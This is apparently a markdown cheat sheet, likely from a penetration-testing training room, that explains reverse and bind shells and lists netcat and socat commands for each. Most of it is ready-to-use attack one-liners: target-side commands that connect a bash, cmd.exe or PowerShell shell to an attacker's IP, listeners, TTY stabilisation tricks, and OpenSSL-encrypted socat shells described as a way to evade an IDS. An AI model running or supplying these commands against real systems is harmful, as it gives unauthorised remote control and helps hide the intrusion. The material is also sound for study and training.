# Reverse-Bind-Shells-Cheat-Sheet

# What is a shell ?

Shell is what we use when interfacing with a Command Line environment (CLI). In other words, the common bash or sh programs in Linux are examples of shells, as are cmd.exe and Powershell on Windows. 
We can force the remote server to either send us command line access to the server (a reverse shell), or to open up a port on the server which we can connect to in order to execute further commands (a bind shell).

# Types of Shell

***Reverse shells*** are when the target is forced to execute code that connects back to your computer. Reverse shells are a good way to bypass firewall rules that may prevent you from connecting to arbitrary ports on the target; however, the drawback is that, when receiving a shell from a machine across the internet, you would need to configure your own network to accept the shell.

***Bind shells*** are when the code executed on the target is used to start a listener attached to a shell directly on the target. This would then be opened up to the internet, meaning you can connect to the port that the code has opened and obtain remote code execution that way. This has the advantage of not requiring any configuration on your own network, but may be prevented by firewalls protecting the target.

 ## NETCAT
 
 ### Reverse Shell
 
 On the attacking machine:
 `nc -lvnp <port>` \
-l is used to tell netcat that this will be a listener \
-v is used to request a verbose output \
-n tells netcat not to resolve host names or use DNS. Explaining this is outwith the scope of the room. \
-p indicates that the port specification will follow. 
 
 On the target:
 ```nc <LOCAL-IP> <port> -e /bin/bash``` (for linux)
 
 ### Bind Shell
 
 On the attacking machine:
 ```nc <TARGET_IP> <port>```
 
 On the target:
 ```nc -lvnp <port> -e "cmd.exe"``` (for Windows)
 
 ## Netcat Shell Stabilisation
 
 _Technique 1: Python_
 
 `nc -lvnp <port>` \
 `python -c 'import pty;pty.spawn("/bin/bash")'` \
 `export TERM=xterm` \
 *ctrl + Z* and `stty raw -echo; fg` =>  This does two things: first, it turns off our own terminal echo (which gives us access to tab autocompletes, the arrow keys, and Ctrl + C to kill processes). It then foregrounds the shell, thus completing the process. \
 `nc -lvnp <port>` 
 Note that if the shell dies, any input in your own terminal will not be visible (as a result of having disabled terminal echo). To fix this, type reset and press enter.
 
 _Technique 2: rlwrap_
 
 rlwrap is a program which, in simple terms, gives us access to history, tab autocompletion and the arrow keys immediately upon receiving a shell; however, some manual stabilisation must still be utilised if you want to be able to use Ctrl + C inside the shell. rlwrap is not installed by default on Kali, so first install it with `sudo apt install rlwrap` \
 To use rlwrap, we invoke a slightly different listener: `rlwrap nc -lvnp <port>` \
 Prepending our netcat listener with "rlwrap" gives us a much more fully featured shell. This technique is particularly useful when dealing with Windows shells, which are otherwise notoriously difficult to stabilise. When dealing with a Linux target, it's possible to completely stabilise, by using the same trick as in step three of the previous technique: background the shell with Ctrl + Z, then use stty raw -echo; fg to stabilise and re-enter the shell.
 
 ## Socat
 
 ### Reverse Shells
 
 On the attacking machine:
 `socat TCP-L:<port> -`
 
 On the target machine:
 `socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:"bash -li"` (for Linux target) \
 `socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:powershell.exe,pipes` (for Windows target)
 
 ### Bind Shells
 
 On the attacking machine:
 `socat TCP:<TARGET-IP>:<TARGET-PORT> -`
 
 On tge target machine:
 `socat TCP-L:<PORT> EXEC:"bash -li"` (for Linux target) \
 `socat TCP-L:<PORT> EXEC:powershell.exe,pipes` 
 
 ### A fully stable Linux tty reverse shell
 
 On the attacking machine:
 `socat TCP-L:<port> FILE:`tty`,raw,echo=0`
 
 On the target machine:
 `socat TCP:<LOCAL-ip>:<PORT> EXEC:"bash -li",pty,stderr,sigint,setsid,sane`
         pty; allocates a pseudoterminal on the target -- part of the stabilisation process \
         stderr; makes sure that any error messages get shown in the shell (often a problem with non-interactive shells) \
         sigint; passes any Ctrl + C commands through into the sub-process, allowing us to kill commands inside the shell \
         setsid; creates the process in a new session \
         sane; stabilises the terminal, attempting to "normalise" it.
         
 ##  Socat Encrypted Shells
 
 One of the many great things about socat is that it's capable of creating encrypted shells -- both bind and reverse. Why would we want to do this? Encrypted shells cannot be spied on unless you have the decryption key, and are often able to bypass an IDS as a result. 
 
 We first need to generate a certificate in order to use encrypted shells. This is easiest to do on our attacking machine: 

 `openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt`
 
 This command creates a 2048 bit RSA key with matching cert file, self-signed, and valid for just under a year. When you run this command it will ask you to fill in information about the certificate. This can be left blank, or filled randomly. 
 
 We then need to merge the two created files into a single .pem file: 
 `cat shell.key shell.crt > shell.pem`
 
 Now, when we set up our _reverse shell listener_, we use: 
 ```socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 FILE:`tty`,raw,echo=0``` 
 
 This sets up an OPENSSL listener using our generated certificate. verify=0 tells the connection to not bother trying to validate that our certificate has been     properly signed by a recognised authority. Please note that the certificate must be used on whichever device is listening. 
 
 To connect back, we would use:
 `socat OPENSSL:<LOCAL-IP>:<LOCAL-PORT>,verify=0 EXEC:/bin/bash` 
 
 The same technique would apply for a _bind shell_: 

Target: `socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 EXEC:cmd.exe,pipes` 

Attacker: `socat OPENSSL:<TARGET-IP>:<TARGET-PORT>,verify=0 EXEC:"bash -li",pty,stderr,sigint,setsid,sane`
 

 
